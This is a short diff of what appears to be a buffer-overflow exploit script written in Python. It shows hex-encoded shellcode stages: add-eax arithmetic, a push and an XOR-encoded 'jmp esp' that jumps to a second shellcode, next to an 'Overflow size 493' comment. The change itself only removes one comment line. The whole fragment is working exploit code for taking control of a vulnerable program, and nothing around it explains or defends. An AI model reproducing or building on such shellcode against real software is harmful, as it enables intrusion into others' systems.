@@ -106,7 +106,6 @@ jump_back += "\x05\x32\x34\x33\x03"  # add  eax, 0x03333432
 jump_back += "\x05\x22\x24\x33\x02"  # add  eax, 0x02332422
 jump_back += "\x50"                  # push eax
 
-# jump to second shellcode
 jump_back += "\x7e\x65"                  # jmp esp xored: 0x81
 
 # Overflow size 493
